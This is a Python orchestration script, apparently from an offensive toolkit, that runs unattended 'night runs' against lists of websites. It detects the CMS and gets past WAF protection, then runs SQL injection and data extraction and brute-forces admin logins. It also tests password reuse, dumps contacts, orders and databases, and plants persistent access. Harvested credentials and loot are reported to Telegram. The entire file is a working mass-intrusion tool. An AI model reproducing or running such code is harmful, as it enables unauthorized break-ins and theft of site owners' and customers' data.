# -*- coding: utf-8 -*-
import contextlib
import csv
import io as sio
import json
import os
import sys
import threading
import time
import traceback
from concurrent.futures import FIRST_COMPLETED, ThreadPoolExecutor, wait

from core import browser, config, hints, http, notify, queue, ui, waf
from core import card
from modules import admin, arch, brute, engine, extract, files, keep, mass, orders, reuse, sqli, subdom, tpl, wp, wpfast, wpvuln
from modules import creds as credmod

_REAL = sys.stdout
_TL = threading.local()


class _Router(object):
    def write(self, text):
        buf = getattr(_TL, "buf", None)
        if buf is not None:
            buf.write(text)
        else:
            _REAL.write(text)

    def flush(self):
        if getattr(_TL, "buf", None) is None:
            try:
                _REAL.flush()
            except Exception:
                pass

    def isatty(self):
        return False

    def reconfigure(self, **kw):
        pass


sys.stdout = _Router()

STOP = os.path.join(config.DATA, "STOP")
CREDS_ALL = os.path.join(config.DATA, "creds_all.txt")
RUN = os.path.join(config.DATA, "runs", time.strftime("%Y%m%d_%H%M%S"))
STATE = os.path.join(RUN, "state.json")
FIND = os.path.join(RUN, "findings.csv")
CREDS = os.path.join(RUN, "creds.txt")
ERRS = os.path.join(RUN, "errors.log")
LOCK = threading.Lock()
SEM = threading.Semaphore(2)
STAGE = ThreadPoolExecutor(max_workers=8)
STAGE_LIMIT = 45

_DIRTY = [False]


TAIL = []


def _log(msg):
    with LOCK:
        TAIL.append("%s %s" % (time.strftime("%H:%M:%S"), str(msg)[:90]))
        del TAIL[:-6]
        try:
            with open(ERRS, "a", encoding="utf-8") as f:
                f.write("%s %s\n" % (time.strftime("%H:%M:%S"), msg))
        except Exception:
            pass


def _load():
    if os.path.isfile(STATE):
        try:
            with open(STATE, encoding="utf-8") as f:
                return json.load(f)
        except Exception:
            pass
    return {}


def _save(d):
    with LOCK:
        try:
            with open(STATE, "w", encoding="utf-8") as f:
                json.dump(d, f, ensure_ascii=False)
        except Exception:
            pass
    _DIRTY[0] = False


def _saver(stop, st):
    while not stop.wait(5):
        if _DIRTY[0]:
            _save(st)


def _run(fn, buf, a):
    _TL.buf = buf
    try:
        return fn(*a)
    finally:
        _TL.buf = None


def _call(fn, limit, *a):
    buf = sio.StringIO()
    fut = STAGE.submit(_run, fn, buf, a)
    try:
        out = fut.result(timeout=limit or STAGE_LIMIT)
    except Exception as e:
        if type(e).__name__ == "TimeoutError":
            return buf.getvalue(), None, "таймаут"
        return buf.getvalue(), None, str(e).splitlines()[0]
    return buf.getvalue(), out, ""


def _blocked(host):
    w = waf.detect(host, 12)
    if w["strategy"] in ("browser", "wait"):
        return "защита"
    if w["kind"] == "dead":
        return "нет связи"
    return ""


def _append(host, rec):
    with LOCK:
        for d in (os.path.dirname(FIND), os.path.dirname(CREDS), os.path.dirname(CREDS_ALL)):
            if d:
                os.makedirs(d, exist_ok=True)
        new = not os.path.isfile(FIND)
        with open(FIND, "a", encoding="utf-8", newline="") as f:
            w = csv.writer(f, delimiter=";")
            if new:
                w.writerow(["хост", "баллы", "находки", "вход", "время"])
            w.writerow([host, rec.get("score", 0), ", ".join(rec.get("notes") or []),
                        rec.get("creds", ""), rec.get("at", "")])
        if rec.get("creds"):
            line = "%s;%s;%s\n" % (host, rec["creds"], rec.get("at", ""))
            for path in (CREDS, CREDS_ALL):
                with open(path, "a", encoding="utf-8") as f:
                    f.write(line)


def _stage(st, host, text, rec=None):
    r = rec if rec is not None else (st.get(host) or {})
    r["stage"] = text
    st[host] = r
    _DIRTY[0] = True


def _is_admin(host, home_title, home_len):
    try:
        r = http.get(host, "/admin/", timeout=20)
    except Exception:
        return False
    low = r.text.lower()
    if r.url.rstrip("/") == ("https://" + host).rstrip("/"):
        if "name=\"username\"" not in low and "ocsessid" not in low:
            return False
    if r.status_code != 200:
        return False
    if "name=\"username\"" in low or "user_token" in low or "ocsessid" in low:
        return True
    t = mass._title(r.text)
    return bool(t and t != home_title and abs(len(r.text) - home_len) > max(2500, home_len // 10))


def work(host, st, use_browser=True, full=False):
    rec = st.get(host) or {}
    if rec.get("done"):
        return host, rec
    try:
        return _work(host, st, use_browser, full)
    except Exception:
        _log("%s сбой: %s" % (host, traceback.format_exc().replace("\n", " | ")[:300]))
        rec = st.get(host) or {}
        rec.setdefault("notes", []).append("сбой")
        rec["done"] = True
        rec["at"] = time.strftime("%Y-%m-%d %H:%M")
        st[host] = rec
        _DIRTY[0] = True
        return host, rec
    finally:
        http.drop(host)


def _work(host, st, use_browser, full):
    rec = st.get(host) or {}
    _stage(st, host, "проверка", rec)

    kind = _call(engine.detect, 30, host)[1]
    if isinstance(kind, tuple):
        kind = kind[0]
    kind = kind or "неизвестно"
    if kind == "нет связи":
        st[host] = {"score": -2, "notes": ["нет связи"], "creds": "", "done": True,
                    "at": time.strftime("%Y-%m-%d %H:%M")}
        _DIRTY[0] = True
        return host, st[host]

    guard = _call(_blocked, 25, host)[1] or ""
    if guard == "защита":
        if not use_browser:
            st[host] = {"score": 0, "notes": ["защита"], "creds": "", "done": True,
                        "at": time.strftime("%Y-%m-%d %H:%M")}
            _DIRTY[0] = True
            return host, st[host]
        _stage(st, host, "браузер", st.get(host))
        try:
            SEM.acquire()
            try:
                got = browser.auto_proc(host, (st.get(host) or {}).get("url"), 45)
            finally:
                SEM.release()
        except Exception as e:
            _log("%s браузер: %s" % (host, e))
            got = {}
        if got.get("cookies"):
            browser.save_state(host, got)
        if (_call(_blocked, 25, host)[1] or "") == "защита":
            st[host] = {"score": 0, "notes": ["защита не пройдена"], "creds": "",
                        "done": True, "at": time.strftime("%Y-%m-%d %H:%M")}
            _DIRTY[0] = True
            return host, st[host]

    t0 = time.time()
    score, notes, title = 0, [], ""
    _stage(st, host, "оценка", rec)
    data = _call(mass.scan, 90, host)[1]
    if isinstance(data, tuple):
        _, score, notes_s, title, _finds = data
        notes = [notes_s] if notes_s else []

    ver = _call(engine.version, 25, host, kind)[1] or ""
    if ver:
        notes.append("v" + str(ver))
        hint = hints.get(kind, ver)
        if hint:
            notes.append(hint[:70])

    rec = {"score": score, "notes": notes + [kind], "creds": "", "done": False}

    if kind not in ("opencart", "wordpress", "bitrix", "prestashop", "laravel", "django"):
        rec["done"] = True
        rec["at"] = time.strftime("%Y-%m-%d %H:%M")
        st[host] = rec
        _DIRTY[0] = True
        _append(host, rec)
        queue.drop(host, "trash")
        return host, rec

    if score >= 3 and time.time() - t0 < 400:
        _stage(st, host, "поддомены", rec)
        sd = _call(subdom.run, 90, host)[1] or []
        if sd:
            rec["notes"].append("поддомены: %d" % len(sd))
            notify.send_lvl(3, "ПОДДОМЕНЫ\n%s\n%s" % (host, ", ".join(sd[:5])))

    if kind == "wordpress" and score >= 0:
        _stage(st, host, "плагины", rec)
        pl = _call(wp.plugins, 40, host)[1] or []
        if pl:
            rec["notes"].append("плагины: " + ", ".join(pl[:4]))
            vh = _call(wpvuln.run, 60, host, pl)[1] or []
            if vh:
                rec["notes"].append("уязв: " + ", ".join(vh[:3]))

    if time.time() - t0 < 420:
        _stage(st, host, "шаблоны", rec)
        try:
            th = _call(tpl.run, 200, host, kind, True)[1] or []
        except Exception as e:
            _log("%s шаблоны: %s" % (host, e))
            th = []
        if th:
            rec["notes"].append("шаблоны: %d" % len(th))
            score = min(12, score + min(4, len(th) * 2))
            strong = ("x-bx-restore", "x-ps-parameters", "sqli", "x-wp-env",
                      "x-jm-config", "x-oc-dump", "x-fr-guest", "x-jm-users")
            loud = [f for f in th if str(f.get("tag", "")).startswith(strong)]
            if loud:
                lvl = 2 if len(loud) else 3
                notify.send_lvl(lvl, "ЗАЦЕПКИ\n%s\n%s" % (
                    host, "\n".join("%s: %s" % (f.get("tag"), str(f.get("url"))[:60])
                                     for f in loud[:4])))

    if score >= 2 and time.time() - t0 < 400:
        _stage(st, host, "файлы", rec)
        _call(files.run, 240, host, kind)
        dump = os.path.join(config.LOGS, host + "_files.txt")
        if os.path.isfile(dump) and os.path.getsize(dump) > 0:
            rec["notes"].append("файлы")
            body = ""
            try:
                with open(dump, encoding="utf-8", errors="ignore") as f:
                    body = f.read()[:400000]
            except Exception:
                body = ""
            if body:
                res = _call(credmod.run, 90, host, body)[1] or ""
                if res:
                    rec["notes"].append(res[:80])
                    if "ВХОД" in res:
                        notify.send_lvl(2, "КРЕДЫ\n%s\n%s" % (host, res))

    if score >= 2 and time.time() - t0 < 400:
        _stage(st, host, "инъекции", rec)
        out, sq, _e = _call(sqli.run, 180, host, kind)
        if "ВРЕМЕННАЯ" in out or "ОШИБКА SQL" in out:
            rec["notes"].append("sqli")
            if sq:
                _stage(st, host, "разработка", rec)
                ex = _call(extract.run, 420 if full else 120, host, sq, full)[1] or []
                if ex:
                    rec["notes"].append("вывод: %d" % len(ex))
                    loud = [f for f in ex if f.get("tag") in ("extract:база", "extract:таблицы")]
                    if loud:
                        notify.send_lvl(2, "ИНЪЕКЦИЯ\n%s\n%s" % (host, loud[0].get("extra", "")))

    if score >= 4 and time.time() - t0 < 400:
        _stage(st, host, "архивы", rec)
        ah = _call(arch.run, 120, host)[1] or []
        if ah and isinstance(ah[0], (list, tuple)) and len(ah[0]) > 1:
            rec["notes"].append("архив " + str(ah[0][1]))
            notify.send_lvl(3, "АРХИВ\n%s\n%s" % (host, ah[0][0]))

    hits = []
    if time.time() - t0 < 500:
        has_admin = _is_admin(host, title, 0)
        if not has_admin and score >= 3:
            _stage(st, host, "поиск админки", rec)
            try:
                from modules import adminfind
                hits = _call(adminfind.run, 300, host, 16, None, kind)[1] or []
            except Exception as e:
                _log("%s adminfind: %s" % (host, e))
                hits = []
            if hits:
                rec["notes"].append("админка: " + hits[0][0])
                has_admin = True
        if has_admin:
            rec["notes"].append("админка")
            _stage(st, host, "подбор", rec)
            login = hits[0][0] if hits else ""
            res = ("none",)
            if kind == "wordpress":
                us = _call(wp.users, 40, host)[1] or ["admin"]
                words = brute._words(host, title)
                pairs = [(u, p) for u in us[:4] for p in words[:12]]
                pairs += [("admin", p) for p in words[12:80]]
                creds = _call(wpfast.run_pairs, 240, host, pairs, True)[1] or ""
                if not creds:
                    res = _call(brute.run, 240, host, title, True, kind, 12, 0.3, login)[1] or ("none",)
            else:
                res = _call(brute.run, 300, host, title, True, kind, 12, 0.3, login)[1] or ("none",)
            if isinstance(res, tuple) and res[0] == "ok":
                creds = "%s:%s" % (res[1], res[2])
            elif isinstance(res, str):
                creds = res
            else:
                creds = ""
            if not creds and isinstance(res, tuple) and res[0] in ("captcha", "limit"):
                rec["notes"].append("отложен: " + res[0])
                with open(brute.PARK_FILE, "a", encoding="utf-8") as f:
                    f.write("%s|%s|%s|%s\n" % (host, kind, res[0], login))
            if creds:
                rec["creds"] = creds
                rec["notes"].append("ВХОД")
                notify.send_lvl(1, "ВХОД\n%s\n%s\n%s" % (host, creds, kind))

                _stage(st, host, "повтор пар", rec)
                rp = _call(reuse.run, 90, host, creds)[1] or []
                if rp:
                    rec["notes"].append("повтор: " + ",".join(rp))
                    notify.send_lvl(2, "ПОВТОР ПАРОЛЯ\n%s\n%s" % (host, ", ".join(rp)))

                if full:
                    _stage(st, host, "слив", rec)
                    got = _call(admin.dump, 300, host, creds, kind)[1] or ""
                    if got:
                        n = got.rsplit(":", 1)[-1]
                        rec["notes"].append("слив %s" % n)
                        notify.send_lvl(1, "СЛИВ %s: %s контактов" % (host, n))

                    if kind == "opencart":
                        _stage(st, host, "заказы", rec)
                        orr = _call(orders.run, 200, host, creds)[1] or ""
                        if orr:
                            rec["notes"].append("заказов %s" % orr.rsplit(":", 1)[-1])

                        _stage(st, host, "база", rec)
                        db = _call(admin.backup, 240, host, creds)[1] or ""
                        if db:
                            rec["notes"].append("БАЗА %d КБ" % (int(db.rsplit(":", 1)[-1]) // 1024))
                            notify.send_lvl(1, "БАЗА слита\n%s\n%s" % (host, db.rsplit(":", 1)[-1]))

                        _stage(st, host, "закреп", rec)
                        kept = _call(keep.keep, 120, host, creds)[1] or ""
                        if kept:
                            rec["notes"].append("доступ: " + kept[:60])
                            notify.send_lvl(1, "ЗАКРЕПЛЕНИЕ\n%s\n%s" % (host, kept))

    rec.pop("stage", None)
    rec["done"] = True
    rec["at"] = time.strftime("%Y-%m-%d %H:%M")
    st[host] = rec
    _DIRTY[0] = True
    _append(host, rec)
    try:
        notify.site(host, rec)
    except Exception as e:
        _log("%s notify: %s" % (host, e))
    try:
        sc = rec.get("score", 0)
        if rec.get("creds") or sc > 0:
            queue.drop(host, "done")
        elif sc <= 0:
            queue.drop(host, "trash")
    except Exception as e:
        _log("%s queue: %s" % (host, e))
    return host, rec


def _row(host, rec):
    stage = rec.get("stage")
    notes = ", ".join(rec.get("notes") or [])
    s = rec.get("score", 0)
    if rec.get("creds"):
        c, tail = ui.RED, rec.get("creds", "")
    elif rec.get("done") and s >= 5:
        c, tail = ui.YELLOW, notes
    elif rec.get("done"):
        c, tail = ui.GREEN, (notes or "чисто")
    elif stage:
        c, tail = ui.CYAN, "<" + stage + ">"
    else:
        c, tail = ui.GREY, "ждёт"
    print("  " + c + "%-28s %3d %-26s" % (host, s, tail[:26]) + ui.OFF, flush=True)


def _draw(st, done, total, order, workers=0):
    ui.clear()
    ui.banner()
    ui.head("НОЧНОЙ ПРОГОН", "%d / %d  потоков %d" % (done, total, workers))
    for host in order:
        _row(host, st.get(host) or {})
    if TAIL:
        print()
        for line in TAIL:
            print("  " + ui.YELLOW + "  ! " + line + ui.OFF)
    if os.path.isfile(STOP):
        print()
        ui.warn("найден STOP, встаю после текущих")


def _painter(st, box, total, stop, order, workers=0):
    while not stop.wait(2):
        try:
            _draw(st, box[0], total, order, workers)
        except Exception:
            pass


def run(only=None, n_workers=None, n_limit=None, n_mode=None, n_browser=None):
    hosts = list(only or [])
    if not hosts:
        try:
            from core import state as _state
            hosts = [d["host"] for d in _state.by_status("hot")]
        except Exception:
            hosts = []
        if not hosts:
            hosts = queue.queue()
    if not hosts:
        ui.say("очередь пуста")
        return

    os.makedirs(RUN, exist_ok=True)
    st = _load()
    if st:
        if ui.ask("сбросить прошлое состояние (1 да / 0 продолжить)", "1") == "1":
            st = {}
            _save(st)

    left = [h for h in hosts if not (st.get(h) or {}).get("done")]
    left = list(dict.fromkeys(left))
    left.sort(key=lambda x: -(st.get(x) or {}).get("score", 0))
    ui.say("в очереди: %d" % len(left))

    ui.say("проверка сети")
    alive = 0
    for probe in ("google.com", "cloudflare.com", "example.com"):
        try:
            r = http.get(probe, "/", timeout=10)
            if r.status_code < 500:
                alive += 1
                break
        except Exception:
            pass
    if not alive:
        ui.err("сеть не отвечает — проверь VPN и прокси")
        if ui.ask("всё равно запускать (1 да)", "0") != "1":
            return
    else:
        ui.ok("сеть жива")

    workers = str(n_workers) if n_workers else ui.ask("потоков", "3")
    br = str(n_browser) if n_browser is not None else ui.ask("браузер при защите (1 да / 0 нет)", "1")
    limit = str(n_limit) if n_limit else ui.ask("сколько целей (пусто = все)", "")
    hours = ui.ask("часов работать (пусто = без предела)", "")
    mode = str(n_mode) if n_mode else ui.ask("режим: 1 тихий / 2 полный (база и закреп)", "1")

    try:
        workers = max(1, min(16, int(workers)))
    except Exception:
        workers = 3
    if limit:
        try:
            left = left[:int(limit)]
        except Exception:
            pass

    total = len(left)
    if hours:
        try:
            def _timer():
                time.sleep(float(hours) * 3600)
                with open(STOP, "w", encoding="utf-8") as f:
                    f.write("timer")
            threading.Thread(target=_timer, daemon=True).start()
        except Exception:
            pass

    started = time.strftime("%H:%M:%S")
    try:
        cp = card.start("run", started)
        if cp:
            notify.photo(cp, "старт %s | целей %d" % (started, total))
    except Exception:
        pass

    for h in left:
        st[h] = {"score": 0, "notes": [], "creds": "", "stage": "в очереди"}

    stop = threading.Event()
    box = [0]
    done = 0
    threading.Thread(target=_saver, args=(stop, st), daemon=True).start()
    threading.Thread(target=_painter, args=(st, box, total, stop, left, workers), daemon=True).start()

    window = workers + 1
    for h in left[:window]:
        st[h]["stage"] = "взято в пул" 
    pending = set()
    it = iter(left)
    pool = ThreadPoolExecutor(max_workers=workers)

    def fill():
        while len(pending) < window and not stop.is_set():
            try:
                h = next(it)
            except StopIteration:
                return
            pending.add(pool.submit(work, h, st, br != "0", mode == "2"))

    try:
        fill()
        while pending:
            try:
                fin, pending = wait(pending, return_when=FIRST_COMPLETED)
            except KeyboardInterrupt:
                ui.warn("прервано с клавиатуры, дочищаю")
                break
            for fut in fin:
                try:
                    fut.result()
                except Exception as e:
                    _log("цель: " + traceback.format_exc(limit=1).replace("\n", " "))
                done += 1
                box[0] = done
            if os.path.isfile(STOP):
                stop.set()
                break
            fill()
    finally:
        stop.set()
        pool.shutdown(wait=False)
        _save(st)

    hits = [(h, r) for h, r in st.items() if r.get("creds")]
    contacts = 0
    for _, r in st.items():
        for n in (r.get("notes") or []):
            if n.startswith("слив "):
                try:
                    contacts += int(n.split()[1])
                except Exception:
                    pass

    ui.clear()
    ui.banner()
    ui.head("ИТОГ НОЧИ", "входов: %d" % len(hits))
    ui.say("потоков было: %d" % workers)
    for host in left:
        _row(host, st.get(host) or {})
    print()

    report = os.path.join(RUN, "report.txt")
    with open(report, "w", encoding="utf-8") as f:
        f.write("прогон %s\nцелей: %d, отработано: %d, входов: %d\n\n"
                % (RUN, total, done, len(hits)))
        for host in left:
            rec = st.get(host) or {}
            f.write("%-30s %3d %s %s\n" % (host, rec.get("score", 0),
                                           ", ".join(rec.get("notes") or []),
                                           rec.get("creds", "")))
    ui.say("отчёт: " + report)
    if os.path.isfile(ERRS):
        ui.say("ошибки: " + ERRS)

    with open(os.path.join(config.DATA, "summary.txt"), "a", encoding="utf-8") as f:
        f.write("%s целей=%d отработано=%d входов=%d контактов=%d\n"
                % (time.strftime("%Y-%m-%d %H:%M"), total, done, len(hits), contacts))

    msg = "PABLOS: прогон окончен\nцелей %d, отработано %d, входов %d" % (total, done, len(hits))
    for host, rec in hits[:15]:
        msg += "\n%s  %s" % (host, rec.get("creds"))
    cp = ""
    try:
        cp = card.end("run", time.strftime("%H:%M:%S"),
                      "целей %d, отработано %d, входов %d" % (total, done, len(hits)))
    except Exception:
        cp = ""
    if cp:
        notify.photo(cp, msg[:900])
        ui.say("итог отправлен карточкой")
    elif notify.send(msg):
        ui.say("уведомление отправлено")
    else:
        ui.say("телеграм не настроен")


if __name__ == "__main__":
    run()
